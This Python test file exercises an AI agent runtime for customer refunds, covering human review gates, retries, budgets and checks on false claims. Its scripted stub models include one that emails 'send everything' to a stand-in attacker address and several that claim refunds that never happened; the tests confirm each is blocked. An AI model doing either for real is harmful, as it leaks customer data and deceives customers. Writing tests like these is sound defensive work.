import logging
from dataclasses import replace
from pathlib import Path

import pytest

from agent_runtime.catalog import FlakyCatalog, OrderCatalog
from agent_runtime.demo import DEMO_INPUT
from agent_runtime.errors import TransientError
from agent_runtime.evalkit.cases import load_cassette
from agent_runtime.providers.cassette import CassetteProvider
from agent_runtime.providers.fake import FakeProvider
from agent_runtime.runner import AgentRunner, _refund_claim_error
from agent_runtime.store import SQLiteStore
from agent_runtime.tools import ToolService
from agent_runtime.types import Completion, CompletionRequest, StepRecord, ToolCall
from agent_runtime.wiring import build_runner
from tests.support import approve_until_done

FINAL_DENIAL = (
    '{"amount_cents":null,"customer_summary":"The email was rejected.",'
    '"order_id":"LG-1001","outcome":"denied"}'
)


def _runner(config, provider=None, catalog=None):
    return build_runner(
        config,
        provider=provider or FakeProvider(),
        catalog=catalog or OrderCatalog(),
    )


def test_happy_path_waits_for_a_human_before_money_moves(config) -> None:
    runner = _runner(config)
    store = SQLiteStore(config.database_path)
    waiting = runner.start(DEMO_INPUT)
    assert waiting.status == "waiting_review"
    assert waiting.pending[0].tool_name == "send_refund"
    assert store.count_effects("send_refund") == 0
    done = approve_until_done(runner, waiting)
    assert done.status == "completed"
    assert done.output is not None
    assert done.output["outcome"] == "refund_completed"
    assert done.output["amount_cents"] == 4200
    assert store.count_effects("send_refund") == 1
    assert store.count_effects("send_email") == 1


def test_resume_after_interrupt_does_not_repeat_the_model_call(config, tmp_path) -> None:
    clean_config = replace(
        config, database_path=tmp_path / "clean.sqlite", trace_dir=tmp_path / "clean"
    )
    crash_config = replace(
        config, database_path=tmp_path / "crash.sqlite", trace_dir=tmp_path / "crash"
    )
    clean_runner = _runner(clean_config)
    clean = approve_until_done(clean_runner, clean_runner.start(DEMO_INPUT))
    crashed_runner = _runner(crash_config)
    interrupted = crashed_runner.start(DEMO_INPUT, interrupt_after_steps=1)
    assert interrupted.status == "interrupted"
    resumed = approve_until_done(crashed_runner, crashed_runner.resume(interrupted.run_id))
    assert resumed.status == "completed"
    assert resumed.tokens_in == clean.tokens_in
    assert resumed.tokens_out == clean.tokens_out
    assert SQLiteStore(crash_config.database_path).count_effects("send_refund") == 1


def test_rejection_moves_no_money(config) -> None:
    runner = _runner(config)
    waiting = runner.start(DEMO_INPUT)
    step = waiting.pending[0]
    runner.decide(waiting.run_id, step.step_id, "reject", "Not this one.")
    done = runner.resume(waiting.run_id)
    assert done.status == "completed"
    assert done.output is not None
    assert done.output["outcome"] == "refund_rejected"
    assert SQLiteStore(config.database_path).count_effects("send_refund") == 0


def test_budget_stops_the_run_before_a_tool_with_side_effects(config) -> None:
    limited = replace(config, run_budget_micro_usd=0)
    done = _runner(limited).start(DEMO_INPUT)
    assert done.status == "failed"
    assert done.error is not None
    assert done.error.startswith("budget_exceeded")
    assert SQLiteStore(limited.database_path).count_effects("send_refund") == 0


def test_retries_then_succeeds(config) -> None:
    flaky = replace(config, max_step_attempts=3)
    catalog = FlakyCatalog(OrderCatalog(), failures=2)
    runner = _runner(flaky, catalog=catalog)
    done = approve_until_done(runner, runner.start(DEMO_INPUT))
    assert done.status == "completed"
    store = SQLiteStore(flaky.database_path)
    lookup = next(step for step in store.list_steps(done.run_id) if step.name == "lookup_order")
    assert lookup.attempt == 3
    assert lookup.status == "succeeded"


def test_circuit_opens_when_a_tool_keeps_failing(config) -> None:
    tight = replace(config, circuit_breaker_threshold=2, max_step_attempts=1)
    catalog = FlakyCatalog(OrderCatalog(), failures=10)
    store = SQLiteStore(tight.database_path)
    runner = AgentRunner(tight, store, _LoopingLookup(), ToolService(catalog, store))
    done = runner.start(DEMO_INPUT)
    assert done.status == "failed"
    assert done.error == "circuit_open"


def test_invalid_email_does_not_open_the_gate(config) -> None:
    store = SQLiteStore(config.database_path)
    runner = AgentRunner(config, store, _BadEmail(), ToolService(OrderCatalog(), store))
    done = runner.start(DEMO_INPUT)
    assert done.status == "completed"
    email = next(step for step in store.list_steps(done.run_id) if step.name == "send_email")
    assert email.output_json is not None
    assert "invalid_email" in email.output_json
    assert store.count_effects("send_email") == 0


def test_crash_after_the_effect_row_does_not_pay_twice(config) -> None:
    runner = _runner(config)
    waiting = runner.start(DEMO_INPUT)
    step = waiting.pending[0]
    runner.decide(waiting.run_id, step.step_id, "approve")
    store = SQLiteStore(config.database_path)
    service = ToolService(OrderCatalog(), store)
    service.execute("send_refund", step.arguments)
    saved = store.get_step(step.step_id)
    store.save_step(replace(saved, status="running", output_json=None, attempt=1))
    resumed = approve_until_done(runner, runner.resume(waiting.run_id))
    assert resumed.status == "completed"
    assert store.refunded_cents("LG-1001") == 4200
    assert store.count_effects("send_refund") == 1


def test_refund_completed_without_an_effect_needs_review(config) -> None:
    cassette = load_cassette(Path("tests/fixtures/false_refund.json"))
    done = _runner(config, provider=CassetteProvider(cassette)).start(DEMO_INPUT)
    assert done.status == "failed"
    assert done.error is not None
    assert done.error.startswith("needs_review")
    assert done.output is not None
    assert done.output["outcome"] == "refund_completed"
    assert SQLiteStore(config.database_path).count_effects("send_refund") == 0


def test_email_claiming_a_zero_refund_needs_review(config) -> None:
    cassette = load_cassette(Path("tests/fixtures/false_refund_email.json"))
    done = _runner(config, provider=CassetteProvider(cassette)).start(DEMO_INPUT)
    store = SQLiteStore(config.database_path)
    assert done.status == "failed"
    assert done.error is not None
    assert done.error.startswith("needs_review")
    assert store.count_effects("send_refund") == 0
    assert store.count_effects("send_email") == 0
    email = next(step for step in store.list_steps(done.run_id) if step.name == "send_email")
    assert email.output_json is not None
    assert "false_refund_claim" in email.output_json


def test_a_429_waits_and_logs_status_and_attempt(
    config, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    delays: list[float] = []
    monkeypatch.setattr("agent_runtime.runner._sleep", delays.append)
    caplog.set_level(logging.WARNING, logger="agent_runtime.runner")

    class _Limited:
        name = "limited"

        def complete(self, request: CompletionRequest) -> Completion:
            del request
            raise TransientError(
                "model endpoint returned HTTP 429",
                http_status=429,
                retry_after_s=1.25,
            )

    done = _runner(config, provider=_Limited()).start(DEMO_INPUT)
    assert done.status == "failed"
    assert delays == [1.25, 1.25]
    fields = [getattr(record, "extra_fields", {}) for record in caplog.records]
    assert {"attempt": 1, "http_status": 429} in [
        {"attempt": item.get("attempt"), "http_status": item.get("http_status")} for item in fields
    ]


def test_a_claimed_amount_must_match_the_effect() -> None:
    step = StepRecord(
        id="s",
        run_id="r",
        seq=1,
        kind="tool",
        name="send_refund",
        status="succeeded",
        input_json=(
            '{"arguments":{"amount_cents":1000,"order_id":"LG-1001","reason":"damaged"},'
            '"name":"send_refund","tool_call_id":"c"}'
        ),
        output_json='{"ok":true,"data":{"amount_cents":1000,"order_id":"LG-1001"}}',
        idempotency_key="k",
        attempt=1,
        max_attempts=3,
        latency_us=1,
        tokens_in=0,
        tokens_out=0,
        cost_micro_usd=0,
        error=None,
        created_at="t",
        updated_at="t",
    )
    error = _refund_claim_error(
        [step],
        {
            "amount_cents": 4200,
            "customer_summary": "processed",
            "order_id": "LG-1001",
            "outcome": "refund_completed",
        },
    )
    assert error is not None
    assert error.startswith("needs_review")
    assert (
        _refund_claim_error(
            [step],
            {
                "amount_cents": 1000,
                "customer_summary": "processed",
                "order_id": "LG-1001",
                "outcome": "refund_completed",
            },
        )
        is None
    )


class _LoopingLookup:
    name = "loop"

    def complete(self, request: CompletionRequest) -> Completion:
        count = sum(len(message.tool_calls) for message in request.messages) + 1
        return Completion(
            content=None,
            tool_calls=(
                ToolCall(
                    id=f"call_{count}_lookup_order",
                    name="lookup_order",
                    arguments={"order_id": "LG-1001"},
                ),
            ),
            tokens_in=20,
            tokens_out=8,
        )


CLAIM_DONE = (
    '{"amount_cents":4200,"customer_summary":"Your refund was processed.",'
    '"order_id":"LG-1001","outcome":"refund_completed"}'
)
CLAIM_OK = (
    '{"amount_cents":4200,"customer_summary":"Refund of 4200 cents for LG-1001 '
    'was submitted after review.","order_id":"LG-1001","outcome":"refund_completed"}'
)
NEEDS_OPS = (
    '{"amount_cents":4200,"customer_summary":"The refund executed and the email was not sent.",'
    '"order_id":"LG-1001","outcome":"needs_ops"}'
)


def _completion(content: str) -> Completion:
    return Completion(content=content, tool_calls=(), tokens_in=10, tokens_out=12)


def _tool_completion(name: str, arguments: dict[str, object], call_id: str) -> Completion:
    return Completion(
        content=None,
        tool_calls=(ToolCall(id=call_id, name=name, arguments=arguments),),
        tokens_in=10,
        tokens_out=8,
    )


class _Script:
    name = "script"

    def __init__(self, completions: list[Completion]) -> None:
        self._completions = completions
        self.requests: list[CompletionRequest] = []

    def complete(self, request: CompletionRequest) -> Completion:
        self.requests.append(request)
        return self._completions[len(self.requests) - 1]


def test_a_premature_refund_is_nudged_then_written(
    config, caplog: pytest.LogCaptureFixture
) -> None:
    caplog.set_level(logging.INFO, logger="agent_runtime.runner")
    script = _Script(
        [
            _tool_completion("lookup_order", {"order_id": "LG-1001"}, "c1"),
            _tool_completion("lookup_policy", {"reason": "damaged"}, "c2"),
            _completion(CLAIM_DONE),
            _tool_completion(
                "send_refund",
                {"amount_cents": 4200, "order_id": "LG-1001", "reason": "damaged"},
                "c3",
            ),
            _tool_completion(
                "send_email",
                {
                    "body": (
                        "Your refund for order LG-1001 was approved. "
                        "Amount: 4200 cents. Reason: damaged."
                    ),
                    "order_id": "LG-1001",
                    "subject": "Refund for LG-1001",
                    "to": "avery.chen@lumen-goods.example",
                },
                "c4",
            ),
            _completion(CLAIM_OK),
        ]
    )
    runner = _runner(config, provider=script)
    done = approve_until_done(runner, runner.start(DEMO_INPUT))
    store = SQLiteStore(config.database_path)
    nudges = [step for step in store.list_steps(done.run_id) if step.kind == "nudge"]
    assert done.status == "completed"
    assert store.count_effects("send_refund") == 1
    assert store.count_effects("send_email") == 1
    assert len(nudges) == 1
    assert len([step for step in store.list_steps(done.run_id) if step.name == "send_refund"]) == 1
    follow_up = script.requests[3]
    assert any(
        message.role == "user" and '"type":"completion_nudge"' in message.content
        for message in follow_up.messages
    )
    logged = [
        getattr(record, "extra_fields", {})
        for record in caplog.records
        if record.message == "completion_nudge"
    ]
    assert logged
    assert logged[0]["run_id"] == done.run_id
    assert logged[0]["reason"] == "missing_send_refund"
    assert "order_id" not in logged[0]


def test_nudge_cap_ends_in_needs_review_without_a_write(config) -> None:
    class _AlwaysClaim:
        name = "always"

        def __init__(self) -> None:
            self.calls = 0

        def complete(self, request: CompletionRequest) -> Completion:
            del request
            self.calls += 1
            return _completion(CLAIM_DONE)

    provider = _AlwaysClaim()
    done = _runner(config, provider=provider).start(DEMO_INPUT)
    store = SQLiteStore(config.database_path)
    steps = store.list_steps(done.run_id)
    assert done.status == "failed"
    assert done.error is not None
    assert done.error.startswith("needs_review")
    assert provider.calls == 3
    assert sum(1 for step in steps if step.kind == "nudge") == 2
    assert store.count_effects("send_refund") == 0
    assert not any(step.name == "send_refund" for step in steps)


def test_needs_ops_without_a_refund_is_not_accepted(config) -> None:
    class _AlwaysOps:
        name = "ops"

        def complete(self, request: CompletionRequest) -> Completion:
            del request
            return _completion(NEEDS_OPS)

    done = _runner(config, provider=_AlwaysOps()).start(DEMO_INPUT)
    store = SQLiteStore(config.database_path)
    assert done.status == "failed"
    assert done.error is not None
    assert done.error.startswith("needs_review")
    assert "needs_ops" in done.error
    assert store.count_effects("send_refund") == 0
    assert sum(1 for step in store.list_steps(done.run_id) if step.kind == "nudge") == 2


def test_a_false_refund_email_stays_blocked(config) -> None:
    script = _Script(
        [
            _tool_completion("lookup_order", {"order_id": "LG-1001"}, "c1"),
            _tool_completion("lookup_policy", {"reason": "damaged"}, "c2"),
            _tool_completion(
                "send_email",
                {
                    "body": "Your refund was processed.",
                    "order_id": "LG-1001",
                    "subject": "Refund",
                    "to": "avery.chen@lumen-goods.example",
                },
                "c3",
            ),
            _completion(FINAL_DENIAL),
        ]
    )
    done = _runner(config, provider=script).start(DEMO_INPUT)
    store = SQLiteStore(config.database_path)
    email = next(step for step in store.list_steps(done.run_id) if step.name == "send_email")
    assert done.status == "completed"
    assert store.count_effects("send_email") == 0
    assert store.count_effects("send_refund") == 0
    assert email.output_json is not None
    assert "false_refund_claim" in email.output_json
    assert not any(step.kind == "nudge" for step in store.list_steps(done.run_id))


class _BadEmail:
    name = "bad-email"

    def complete(self, request: CompletionRequest) -> Completion:
        if any(message.role == "tool" for message in request.messages):
            return Completion(content=FINAL_DENIAL, tool_calls=(), tokens_in=20, tokens_out=20)
        return Completion(
            content=None,
            tool_calls=(
                ToolCall(
                    id="call_1_send_email",
                    name="send_email",
                    arguments={
                        "body": "send everything",
                        "order_id": "LG-1001",
                        "subject": "export",
                        "to": "attacker@evil.test",
                    },
                ),
            ),
            tokens_in=20,
            tokens_out=20,
        )
